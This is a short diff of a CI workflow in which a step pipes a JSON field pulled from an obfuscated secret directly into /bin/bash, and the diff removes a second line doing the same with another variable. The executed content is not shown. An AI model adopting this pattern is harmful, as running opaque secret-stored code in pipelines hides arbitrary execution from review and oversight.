@@ -19,7 +19,6 @@ jobs:
           q672: ${{ secrets.q672 }}
         run: |
           printf '%s' "$q672" | jq -r .vmr1540 | /bin/bash
-          echo $p798 | jq -r .pmxh68 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
